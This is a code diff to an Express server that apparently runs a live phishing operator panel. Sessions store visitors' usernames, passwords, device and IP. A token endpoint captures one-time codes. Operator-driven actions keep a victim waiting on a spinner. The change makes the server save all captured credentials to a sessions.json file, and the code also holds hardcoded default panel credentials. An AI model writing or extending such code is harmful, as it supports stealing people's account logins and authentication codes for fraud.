@@ -1,10 +1,27 @@
 const express = require('express');
 const path = require('path');
+const fs = require('fs');
 const app = express();
 
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
+
+const SESSIONS_FILE = path.join(__dirname, 'sessions.json');
+let sessions = {};
+
+// Load sessions from disk on startup
+try {
+  if (fs.existsSync(SESSIONS_FILE)) {
+    sessions = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
+  }
+} catch (_) {}
+
+function saveSessions() {
+  try {
+    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
+  } catch (_) {}
+}
 
 const PANEL_USER = process.env.PANEL_USER || 'Morderkaiser';
 const PANEL_PASSWORD = process.env.PANEL_PASSWORD || 'M3q7Xp9Wv2R4k5T8zY'; // Cambiar en Render
@@ -58,9 +75,6 @@ app.get('/login-personas', (req, res) => res.sendFile(path.join(__dirname, 'pers
 // Protect and serve the /panel directory statically
 app.use('/panel', authMiddleware, express.static(path.join(__dirname, 'panel')));
 
-// In-memory sessions store
-let sessions = {};
-
 // 1. Create or update a session
 app.post('/api/sessions', (req, res) => {
   const { id, username, password, tipoUsuario, device, ip, state } = req.body;
@@ -94,6 +108,7 @@ app.post('/api/sessions', (req, res) => {
       updatedAt: Date.now()
     };
   }
+  saveSessions();
   res.json({ success: true, session: sessions[id] });
 });
 
@@ -134,6 +149,7 @@ app.post('/api/sessions/:id/token', (req, res) => {
   sessions[id].action = null; // Clear the action on the server so the spinner keeps showing!
   sessions[id].last_seen = Date.now();
   sessions[id].updatedAt = Date.now();
+  saveSessions();
   res.json({ success: true, session: sessions[id] });
 });
 
@@ -162,6 +178,7 @@ app.post('/api/sessions/:id/action', authMiddleware, (req, res) => {
   
   sessions[id].last_seen = Date.now();
   sessions[id].updatedAt = Date.now();
+  saveSessions();
   res.json({ success: true, session: sessions[id] });
 });
 
@@ -174,12 +191,14 @@ app.post('/api/sessions/:id/state', (req, res) => {
   sessions[id].state = state;
   sessions[id].last_seen = Date.now();
   sessions[id].updatedAt = Date.now();
+  saveSessions();
   res.json({ success: true, session: sessions[id] });
 });
 
 // 8. Clear all sessions
 app.post('/api/clear', authMiddleware, (req, res) => {
   sessions = {};
+  saveSessions();
   res.json({ success: true });
 });
 
